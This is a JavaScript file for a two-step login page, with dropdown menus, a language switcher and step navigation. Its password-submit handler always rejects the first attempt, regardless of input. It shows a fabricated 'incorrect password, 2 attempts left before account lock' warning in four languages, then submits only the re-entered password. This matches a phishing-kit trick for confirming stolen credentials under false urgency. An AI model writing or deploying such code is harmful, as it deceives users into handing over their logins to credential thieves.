document.addEventListener("DOMContentLoaded", function () {
  
  function setupDropdowns() {
    const dropdownButtons = document.querySelectorAll(".dropdown-toggle");
    if (dropdownButtons.length > 0) {
      dropdownButtons.forEach(button => {
        button.onclick = function () {
          const content = button.nextElementSibling;
          const isVisible = content && content.style.display === "block";

          // Alles zuklappen
          document.querySelectorAll(".dropdown-content").forEach(el => el.style.display = "none");
          document.querySelectorAll(".dropdown-toggle").forEach(btn => btn.classList.remove("active"));

          if (!isVisible && content) {
            content.style.display = "block";
            button.classList.add("active");
          }
        };
      });
    }
  }

  // Step Navigation
  window.goToStep2 = function () {
    document.getElementById("step1").style.display = "none";
    document.getElementById("step2").style.display = "block";
    validateStep2();
  };

  window.goToStep1 = function () {
    document.getElementById("step2").style.display = "none";
    document.getElementById("step1").style.display = "block";
  };

  const usernameInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const passwordError = document.getElementById("password-error");

  const step1Button = document.getElementById("step1-button");
  const step2Button = document.getElementById("step2-button");

  const form = document.querySelector('form');

  let firstTry = true;

  function validateStep1() {
    step1Button.disabled = usernameInput.value.trim() === "";
  }

  function validateStep2() {
    const usernameFilled = usernameInput.value.trim() !== "";
    const passwordFilled = passwordInput.value.trim() !== "";
    step2Button.disabled = !(usernameFilled && passwordFilled);
  }

  if (usernameInput && step1Button) {
    validateStep1();
    usernameInput.addEventListener("input", () => {
      validateStep1();
      validateStep2();
    });
  }

  if (passwordInput) {
    passwordInput.addEventListener("input", validateStep2);
  }

  if (step2Button) {
    step2Button.addEventListener("click", function (e) {
      e.preventDefault();

      const messages = {
        de: "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.",
        en: "Incorrect password. 2 attempts left before account lock.",
        fr: "Mot de passe incorrect. Encore 2 tentatives avant le blocage du compte.",
        es: "Contraseña incorrecta. Quedan 2 intentos antes de bloquear la cuenta."
      };

      const langSelect = document.getElementById("language") || document.getElementById("language-desktop") || document.getElementById("language-mobile");
      const selectedLang = langSelect ? langSelect.value : "de";

      if (firstTry) {
        passwordError.textContent = messages[selectedLang] || messages["de"];
        passwordError.style.display = "block";
        passwordInput.value = "";
        passwordInput.focus();
        validateStep2();
        firstTry = false;
      } else {
        passwordError.style.display = "none";
        form.submit();
      }
    });
  }

  const langSelect = document.getElementById("language");
  if (langSelect) {
    const savedLang = localStorage.getItem("language");
    if (savedLang) {
      langSelect.value = savedLang;
    }

    langSelect.addEventListener("change", function () {
      const lang = this.value;
      localStorage.setItem("language", lang);

      switch (lang) {
        case "de":
          window.location.href = "/index.html";
          break;
        case "en":
          window.location.href = "/en.html";
          break;
        case "fr":
          window.location.href = "/fr.html";
          break;
        case "es":
          window.location.href = "/es.html";
          break;
      }
    });
  }

  setupDropdowns(); // GANZ WICHTIG: direkt nach Seite laden ausführen
});
